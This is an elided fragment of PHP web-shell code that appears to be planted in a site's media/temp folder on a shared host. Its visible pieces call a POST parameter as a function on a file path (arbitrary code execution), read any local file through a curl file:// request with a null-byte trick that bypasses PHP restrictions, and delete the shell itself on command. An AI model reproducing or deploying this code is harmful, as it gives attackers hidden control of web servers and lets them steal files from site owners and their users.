...
$dir = md5('/home/k3030889/public_html/media/temp/1E6qZkzbGZHh9hWF4dQcTUdbmsYkvBYPrR.txt' );
...
<script>
    ...
    var p4_ = '".((strpos(@$_POST['p4'],"md")===false)?'':htmlspecialchars($_POST['p4']('/home/k3030889/public_html/media/temp/1E6qZkzbGZHh9hWF4dQcTUdbmsYkvBYPrR.txt'),ENT_QUOTES)) ."';
    var d = document;
...
break;
case 3:
$ch = curl_init("file://".$_POST['p2']."\x00".preg_replace('!\(\d+\)\s.*!','','/home/k3030889/public_html/media/temp/1E6qZkzbGZHh9hWF4dQcTUdbmsYkvBYPrR.txt'));
curl_exec($ch);
break;
case 4:
...
if($_POST['p1'] == 'yes')
if(@unlink(preg_replace('!\(\d+\)\s.*!','','/home/k3030889/public_html/media/temp/1E6qZkzbGZHh9hWF4dQcTUdbmsYkvBYPrR.txt')))
